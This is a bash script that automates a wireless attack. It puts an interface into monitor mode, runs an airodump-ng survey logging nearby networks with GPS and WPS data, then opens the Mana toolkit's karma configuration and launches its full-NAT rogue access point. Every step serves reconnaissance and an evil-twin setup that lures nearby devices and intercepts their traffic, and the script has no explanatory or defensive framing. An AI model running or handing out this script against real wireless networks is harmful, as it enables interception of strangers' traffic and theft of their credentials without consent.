#! /bin/bash

echo Starting Mana...but...starting airodump survey first
echo What is the name of the monitor interface wlan1 wlan2 etc
read -p 'Interface: ' invar
airmon-ng start $invar && airmon-ng check kill ${invar}mon
echo Enter filename
read -p 'Filename: ' filevar
echo Enter target Channel. If a single channel just enter the single number. For multiple separate with a comma i.e. 1,6,11. If all type 1-14
read -p 'Channel: ' chanvar
airodump-ng ${invar}mon --gpsd -w /root/airodumplog/$filevar -c $chanvar --wps --write-interval 1 --manufacturer --output-format csv,kismet,netxml,gps
echo Now time to configure Mana...opening config file
cd /etc/mana-toolkit/ && nano hostapd-karma.conf
echo Now time for business
cd /usr/share/mana-toolkit/run-mana && ./start-nat-full.sh
$SHELL
